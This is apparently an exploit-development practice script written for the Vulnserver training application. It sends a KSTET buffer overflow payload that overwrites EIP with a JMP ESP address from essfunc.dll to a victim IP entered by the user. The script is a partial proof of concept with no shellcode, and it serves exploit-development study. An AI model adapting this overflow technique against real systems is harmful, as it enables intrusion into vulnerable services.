#!/usr/bin/env python3
print ("# #########################################")
print ("#  POC KSTET instruction | Vulnserver  ####")
print ("#     Practice OSCE | Exploit Dev      ####")
print ("#           Exploit By r0r0x_xxx       ####")
print ("#           Date: 29-10-2020 	       ####")
print ("#             Socket Reuse   	       ####")
print ("###########################################")

#Banner

print (" _    _                         _    _            _    _             ")
print ("| |  | |                       | |  | |          | |  (_)            ")
print ("| |__| | __ _ _ __  _ __  _   _| |__| | __ _  ___| | ___ _ __   __ _ ")
print ("|  __  |/ _` | '_ \| '_ \| | | |  __  |/ _` |/ __| |/ / | '_ \ / _` |")
print ("| |  | | (_| | |_) | |_) | |_| | |  | | (_| | (__|   <| | | | | (_| |")
print ("|_|  |_|\__,_| .__/| .__/ \__, |_|  |_|\__,_|\___|_|\_\_|_| |_|\__, |")
print ("             | |   | |     __/ |                                __/ |")
print ("             |_|   |_|    |___/                                |___/ ")

from socket import socket, AF_INET, SOCK_STREAM, timeout, error
from sys import exit

timeout_val = 5 # Seconds
host = input("Enter the victim ip address: ")
port = input("Enter the remote port of the victim: ")
victim = ((host, int(port)))

#Jumping to Our Buffer with mona: !mona jmp -n -r ESP
#Address=625011AF jmp esp [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0 
#Address=625011AF = \xAF\x11\x50\x62

payload = b""
payload += b"KSTET /.:/"
payload += b"A" * 66   #EIP 41326341
payload += b"\xAF\x11\x50\x62"
payload += b"C" * (681- len(payload)) 
payload += b"\r\n"

if __name__ == '__main__':
    print('[*] creating the socket :D')
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(timeout_val)
    try:
        print('[*] connecting to the Windows VM')
        s.connect(victim)
        print('[*] sending BOMB...')
        s.send(payload)
        print('[*] Chao')
        s.close()
    except timeout:
        print('[!] socket timeout occurred, Check the application dude?')
        print('\Check the debugger')
        exit(1)
    except error:
        print('[!] The socket does not work, Dude wake up')
        exit(1)

